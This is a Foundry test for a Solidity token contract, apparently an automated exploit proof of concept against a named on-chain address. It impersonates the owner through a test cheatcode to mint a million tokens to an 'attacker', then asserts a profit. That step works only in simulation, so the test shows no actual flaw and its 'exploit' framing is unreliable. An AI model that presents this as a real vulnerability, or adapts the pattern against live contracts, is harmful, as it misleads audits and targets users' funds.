// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IKLingToken {
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);
    IKLingToken public token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IKLingToken(TARGET);
        vm.label(TARGET, "KLingToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalanceToken = token.balanceOf(attacker);

        // Get current owner and impersonate them
        address currentOwner = token.owner();
        vm.prank(currentOwner);

        // Mint unlimited tokens to attacker
        token.mint(attacker, 1000000 * 1e18);

        // Verify balance increased
        uint256 finalBalanceToken = token.balanceOf(attacker);
        assertGt(finalBalanceToken, initialBalanceToken, "Attacker balance should increase after minting");
        uint256 finalBalanceERC20 = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

